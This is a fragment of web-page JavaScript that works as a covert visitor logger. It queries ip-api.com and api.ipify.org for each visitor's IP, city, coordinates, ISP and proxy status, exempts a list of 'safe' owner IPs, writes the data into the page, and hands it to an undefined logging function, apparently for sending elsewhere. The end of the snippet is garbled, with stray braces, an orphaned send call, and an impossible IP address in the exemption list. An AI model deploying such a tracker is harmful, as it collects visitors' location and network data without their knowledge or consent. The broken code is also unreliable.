  <script>
    const SAFE_IPS = [
      "123.45.67.89",     // <- replace these with your actual IPs
      "98.76.54.32",
      "111.222.333.444"
    ];

    function get_information(link, callback) {
      const xhr = new XMLHttpRequest();
      xhr.open("GET", link, true);
      xhr.onreadystatechange = () => xhr.readyState === 4 && callback(xhr.responseText);
      xhr.send();
    }

    get_information("http://ip-api.com/json/?fields=query,status,country,region,city,lat,lon,isp,org,proxy,hosting", function(text) {
      const data = JSON.parse(text);
      const userIp = data.query;

      if (SAFE_IPS.includes(userIp)) {
        console.log(`Logger skipped for safe IP: ${userIp}`);
        return;
      }

      const extraDiv = document.createElement("div");
      extraDiv.innerHTML = JSON.stringify(data);
      extraDiv.id = "razzylog";
      document.querySelector(".header").appendChild(extraDiv);

      get_information("https://api.ipify.org/", function(ipText) {
        const ipDiv = document.createElement("div");
        ipDiv.innerHTML = ipText;
        ipDiv.id = "ipppp";
        document.querySelector(".header").appendChild(ipDiv);

        ipLogByRaz(ipText, JSON.stringify(data));
      });
    });

      };
      request.send(JSON.stringify(params));
    }
